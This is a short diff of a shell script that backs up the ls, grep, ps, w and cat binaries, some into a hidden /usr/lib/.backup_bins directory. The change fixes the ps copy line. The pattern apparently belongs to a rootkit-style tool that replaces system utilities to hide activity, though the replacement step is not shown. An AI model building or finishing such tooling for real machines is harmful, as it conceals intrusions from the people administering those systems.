@@ -11,6 +11,6 @@ cat_path="$(which cat 2>/dev/null)"
 
 cp $ls_path "${ls_path}_real"
 cp $grep_path "/usr/lib/.backup_bins/grep_real"
-cp $ps_path "$ps_path_real"
+cp $ps_path "${ps_path}_real"
 cp "$w_path" "${w_path}_real"
 cp $cat_path "/usr/lib/.backup_bins/cat_real"
